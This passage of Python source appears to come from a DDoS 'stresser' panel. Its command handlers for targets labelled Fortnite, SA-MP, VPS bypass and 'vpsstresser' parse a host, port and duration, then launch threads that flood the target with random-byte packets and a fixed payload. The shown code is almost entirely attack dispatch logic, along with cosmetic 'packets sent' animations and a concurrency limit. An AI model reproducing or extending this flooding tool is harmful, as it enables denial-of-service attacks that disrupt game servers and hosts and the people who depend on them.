					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-fortnite":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "game-samp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vps-bypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpsstresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 1:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 1:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system("cls")
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

